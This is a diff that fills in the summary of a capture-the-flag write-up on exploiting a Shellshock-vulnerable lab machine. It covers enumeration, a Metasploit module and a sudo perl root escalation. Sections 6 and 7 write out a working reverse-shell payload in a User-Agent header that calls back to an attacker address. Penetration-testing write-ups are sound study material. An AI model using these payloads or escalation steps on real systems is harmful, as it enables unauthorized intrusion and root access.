@@ -6,21 +6,32 @@
 
 # Summary
 ### 1. NMAP
-x
+NMAP scan shows only port 80 and port 2222 but nothing much else.
 
 ### 2. Port 80 HTTP Enumeration
-x
+Visiting `http://10.129.1.175` just shows an image "Don't Bug Me!". A Gobuster scan with a `-f` flag shows 3 directories but navigating to them gives us `403 Forbidden` error.
 
 ### 3. Deeper Gobuster Enumeration
-x
+Turns out, Gobuster could search for files too within the directories, and all we needed was a `-x` flag to search for cgi, sh, pl, py files. After a scan, we see a file `/user.sh` exists at path `http://10.129.139.89/cgi-bin/user.sh`.
+
+The file `user.sh` is a bash script that executed everytime we navigate to it. All the clues point to this nachine having a Shellshock vulnerability.
 
 ### 4. Port 80 Shellshock Exploitation (Metasploit)
-x
+Running a NMAP script `--script http-shellshock` to scan for the Shellshock vulnerability, we see that in fact it is vulnerable.
+
+A metasploit exploit for the Shellshock vulnerability exists, module `exploit/multi/http/apache_mod_cgi_bash_env_exec`. We use that and get a meterpreter shell and found the first user flag. However, we did not have the privileges to get the root flag.
 
 ### 5. Privilege Escalation
-x
+Running command `sudo -l` reveals we can run `/usr/bin/perl` with sudo privileges. From this, we can spawn a elevated privileges shell with `sudo perl -e 'exec("/bin/bash")'`, and got the root flag.
 
 ### 6. Alternative Port 80 Shellshock Exploitation (Curl)
+Knowing that we can execute malicious commands in header fields like `User-Agent` with a malicious string `() { :; };`, we run a Curl command which modifies the `User-Agent` header. After setting up a nc listener and running the Curl command `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1' http://10.129.139.89/cgi-bin/user.sh`, we got a shell.
+
+### 7. Alternative Port 80 Shellshock Exploitation (BurpSuite)
+Similar to Chapter 6, we intercept the request to `http://10.129.139.89/cgi-bin/user.sh` with BurpSuite, changed the `User-Agent` header field to `() { :; }; /bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1` after starting up a nc listener, and got a shell.
+
+### 8. Alternative Port 80 Shellshock Exploitation (Python Script)
+A python script `Apache mod_cgi - 'Shellshock' Remote Command Injection` written to exploit the Shellshock vulnerability exists, we use it and got a shell successfully.
 
 # Attack
 ## 1. NMAP
